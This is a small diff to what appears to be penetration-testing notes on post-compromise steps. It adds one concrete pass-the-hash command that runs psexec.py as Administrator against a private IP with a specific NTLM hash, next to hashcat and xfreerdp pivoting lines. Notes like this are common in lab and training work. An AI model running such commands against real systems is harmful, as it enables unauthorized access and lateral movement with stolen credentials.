@@ -259,6 +259,7 @@ Post compromise of the first machine:
       - hashcat --show 
     - Pass the hash: 
       - python psexec.py -hashes :<NTLM Hash> <user>@<IP>
+          - psexec.py "Administrator":@192.168.11.132 -hashes :920ae267e048417fcfe00f49ecbd4b33
 
 - Pivot from first machine to 2nd 
   - xfreerdp /u:<username> /p:<password> /v:<IP>
